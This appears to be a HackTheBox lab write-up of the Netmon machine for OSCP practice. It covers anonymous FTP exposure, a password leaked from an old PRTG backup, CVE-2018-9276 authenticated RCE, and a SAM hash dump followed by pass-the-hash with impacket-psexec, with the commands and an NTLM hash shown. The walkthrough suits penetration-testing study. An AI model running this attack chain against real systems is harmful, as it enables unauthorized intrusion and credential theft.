+++
date = '2026-05-19T00:00:00-03:00'
draft = false
title = 'HTB: Netmon - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'windows', 'ftp', 'prtg', 'default-creds', 'rce', 'cve-2018-9276']
description = 'Write-up for the HackTheBox machine Netmon - extracting a stale config backup via anonymous FTP, deducing a year-incremented password, and exploiting PRTG to get SYSTEM.'
ShowToc = true
TocOpen = false
[cover]
image = 'images/htb-netmon/cover.png'
+++

Netmon is a good reminder that "stale" does not mean "useless." An old config backup with a 2018 password becomes the key to everything once you notice the pattern in the timestamps.

## Machine info

| | |
|---|---|
| **Name** | Netmon |
| **Platform** | HackTheBox |
| **OS** | Windows |
| **Difficulty** | Easy |

## TL;DR

- Anonymous FTP exposes the full `C:\` drive, including PRTG Network Monitor config backups
- Old backup (`PRTG Configuration.old.bak`) leaks the password `PrTg@dmin2018`
- Other config files are dated 2019 - guessing `PrTg@dmin2019` logs into the PRTG web interface
- PRTG 18.1.37 is vulnerable to **CVE-2018-9276** (authenticated RCE) - the exploit creates a local admin user
- Dump SAM with nxc, psexec as Administrator

---

## Recon

### RustScan

```bash
rustscan -a 10.129.230.176
```

![RustScan output: ports 21, 80, 135, 139, 445, 5985, 47001, 49664-49669 open](/images/htb-netmon/rustscan.png)

Port 21 (FTP) and port 80 (HTTP) are the most interesting. The presence of 5985 (WinRM) is noted for later.

---

## Enumeration

### Anonymous FTP - full C:\ access

```bash
ftp 10.129.230.176
```

![ftp anonymous login successful, Remote system type is Windows_NT](/images/htb-netmon/ftp-anonymous.png)

Anonymous login works. The FTP root maps directly to `C:\`. Navigating to the PRTG data directory:

```bash
ftp> dir ProgramData/Paessler/"PRTG Network Monitor"
```

![ftp dir listing: PRTG Configuration.dat, PRTG Configuration.old, PRTG Configuration.old.bak with dates 2019/2019/2018](/images/htb-netmon/ftp-prtg-dir.png)

Three config files. Two from 2019, one old backup from 2018: `PRTG Configuration.old.bak`. Download it.

### Extracting credentials from the backup

```bash
cat "PRTG Configuration.old.bak" | grep -A 5 "prtgadmin"
```

![grep output showing prtgadmin user with password PrTg@dmin2018](/images/htb-netmon/prtg-config-password.png)

Password in the backup: `PrTg@dmin2018`. But the active configs are dated 2019. A reasonable guess: the admin incremented the year. Trying `PrTg@dmin2019`...

---

## Foothold

### PRTG web login

Accessing port 80 with `prtgadmin:PrTg@dmin2019`:

![PRTG Network Monitor dashboard - Welcome PRTG System Administrator, logged in successfully](/images/htb-netmon/prtg-login.png)

The password guess paid off.

### Version fingerprinting and CVE-2018-9276

The footer reveals the installed version:

![PRTG footer showing version 18.1.37.13946](/images/htb-netmon/prtg-version.png)

Searching for known exploits:

```bash
searchsploit PRTG
```

![searchsploit output: PRTG Network Monitor 18.2.38 authenticated RCE (windows/webapps/46527.sh)](/images/htb-netmon/searchsploit.png)

**CVE-2018-9276** - authenticated RCE via the notification system. The exploit creates a new user in the local Administrators group. Version 18.1.37 is also affected.

### Running the exploit

![exploit running, showing authenticated PRTG RCE banner, CVE-2018-9276, creates user pentest:P3nT3st!](/images/htb-netmon/exploit-run.png)

The exploit uses a stored XSS in notifications to inject OS commands. It creates a local admin user: `pentest:P3nT3st!`

Verify the new user works:

```bash
nxc smb 10.129.230.176 -u pentest -p 'P3nT3st\!'
```

![nxc smb result: Pwnd! for netmon\pentest](/images/htb-netmon/nxc-pentest.png)

---

## Privilege Escalation

### Dump SAM hashes with nxc

```bash
nxc smb 10.129.230.176 -u pentest -p 'P3nT3st\!' --sam
```

![nxc --sam output: Administrator NTLM hash d0f73603a4d9b655430fdf02de4afaee and other local hashes](/images/htb-netmon/nxc-sam-dump.png)

### psexec as Administrator

```bash
impacket-psexec Administrator@10.129.230.176 -hashes :d0f73603a4d9b655430fdf02de4afaee
```

![psexec shell: C:\Windows\system32>, type C:\Users\Administrator\Desktop\root.txt showing flag](/images/htb-netmon/psexec-root.png)

SYSTEM shell. Root flag captured.

---

## Takeaways (for OSCP)

- **Anonymous FTP with filesystem access is a goldmine.** The entire `C:\` drive was readable. Always check what is exposed before moving to the web app.
- **Year-incremented passwords are a real pattern.** The 2018 backup leaking `PrTg@dmin2018` plus 2019-dated active configs is an obvious breadcrumb. Never ignore timestamps on files.
- **Authenticated RCE is still RCE.** Getting credentials to the PRTG admin panel was not the end - it was the beginning. Always check what you can do once authenticated, including running scripts or notifications that execute OS commands.

## References

- [HackTheBox - Netmon](https://app.hackthebox.com/machines/Netmon)
- [CVE-2018-9276 - PRTG Authenticated RCE](https://www.exploit-db.com/exploits/46527)
- [PRTG Network Monitor - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/prtg-network-monitor)
- Lain Kusanagi list (OSCP prep)
